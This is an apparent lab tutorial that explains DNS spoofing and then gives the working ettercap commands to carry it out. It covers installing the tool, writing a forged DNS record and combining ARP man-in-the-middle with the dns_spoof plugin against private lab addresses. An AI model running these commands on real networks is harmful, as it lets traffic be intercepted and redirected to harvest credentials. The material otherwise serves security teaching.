# What is DNS Spoofing?
DNS spoofing (or DNS cache poisoning) is a cyberattack that alters the Domain Name System (DNS) records, silently redirecting users from legitimate websites to malicious, attacker-controlled clones.
 The goal is to steal login credentials, distribute malware, or intercept sensitive data.

# *HOW IT WORKS*

The Domain Name System acts as the "phone book" of the internet, translating readable website addresses (e.g., example.com) into numerical IP addresses. The Request:
 When you type a website name, your browser queries a DNS server. The Manipulation: An attacker intercepts this query and injects false information, causing the server to return the wrong IP address.
  The Redirection: Without knowing, your browser connects to a fraudulent site that looks and feels like the real thing, while the browser address bar continues to display the correct, intended URL.

to start the DNS spoofing attack first boot up 3 machines:

1: kali attacker machine.
2: win10 victim machine.
3: pfsense router.

Note: unlike other attacks, this ettercap command performs the ARP spoofing (MITM) itself via the -M arp:remote flag — you don't need to run a separate MITM step first.
The single command below handles both the MITM and the DNS spoofing together.

in order to start the attack you have to install this tool by typing:

```bash
sudo apt install ettercap-text-only -y
```

*WHAT THIS TOOL ACTUALLY DOES*

Ettercap does the DNS lie for you:
it watches for the victim's DNS questions ("what's the IP for x website?"), and answers with a fake IP before the real DNS server gets the chance.

after successfully installing the tool, you need to go to its config file to tell it when (on which site the victim is searching) to spoof and where to spoof.
 Type this in the terminal to enter the config file:

```bash
sudo nano /etc/ettercap/etter.dns
```

after entering the file, scroll down to the end of the file and type the spoofing instructions:

e.g.

```bash
neverssl.com     A   your attacker IP
```

neverssl.com -> the site the victim searches and the spoof happens
A -> record type / spoofing instructions
your attacker IP -> the spoofed site address will be switched to this IP

Save & Quit.

in order to activate the spoofing attack type this in the kali terminal:

```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.56.254// /192.168.56.105//
```

-T — text mode (no GUI, just terminal output)
-q — quiet mode (less noise, only what matters)
-i eth0 — which network interface to use (eth0 = the internal network where pfSense and Win10 sit)
-P dns_spoof — loads the dns_spoof plugin (reads /etc/ettercap/etter.dns and forges answers)
-M arp:remote — the MITM method: ARP spoofing, and remote means you also intercept traffic going out to the internet, not just traffic between the two local machines
/192.168.56.254// — first target (pfSense, the router) — the two trailing / mean "all ports"
/192.168.56.105// — second target (Win10, the victim) — also all ports

*NOTE ON HTTPS/HSTS*
Sites like google.com won't visibly redirect even if the DNS spoof works, because modern browsers force HTTPS on them via HSTS before a DNS lookup even happens.
 Use a plain-HTTP site like neverssl.com to see the spoof actually take effect.
